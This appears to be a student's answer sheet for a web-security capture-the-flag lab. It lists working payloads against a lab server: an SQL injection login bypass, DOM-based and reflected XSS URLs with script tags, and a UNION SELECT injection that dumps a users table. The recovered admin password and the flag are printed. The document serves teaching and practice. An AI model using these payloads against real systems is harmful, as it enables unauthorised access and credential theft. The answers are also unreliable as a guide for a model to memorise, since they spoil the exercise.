SQL
1. Bypass the initial login page using an SQL injection payload and login as “user”.
Injecting custom input to the sql in order to bypass the login page.
input : ' OR '1'='1

2. Identify and exploit the DOM-XSS vulnerability.
We manipulate the DOM, altering the structure and content of the web page by changing the title of the website to 'Get Attacked'.
This manipulation occurs on the client side, making it different from server-side XSS. 
input : http://139.91.71.5:11337/dashboard#user<script>document.title%20=%20"Get%20Attacked";</script>

3. Identify and exploit the reflected XSS vulnerability.
We show that we can manipulate the website by displaying a popup alert with the message 'xyz' that is a proof of concept to demonstrate that the vulnerability exists.
input : http://139.91.71.5:11337/dashboard#user<script>alert('xyz')</script>


4. Misuse the item search functionality to retrieve data from the “users” DB table and acquire the admin’s password. 
Injecting custom input to the sql in order to get the table of all the users, because the code gets the first element from the query we only get the superadmin to show.
input : ' UNION SELECT * FROM users -- 
output : 1 | superadmin | $thisIsUncrackable$

5. Login in as the administrator and fetch the secret flag.
Logging in as administrator to get the flag. 
input : $thisIsUncrackable$
output : TUC{edb714dfce00e69b909ea7365cbbcf66f0d113c38c9ec125adf022b695fec86d}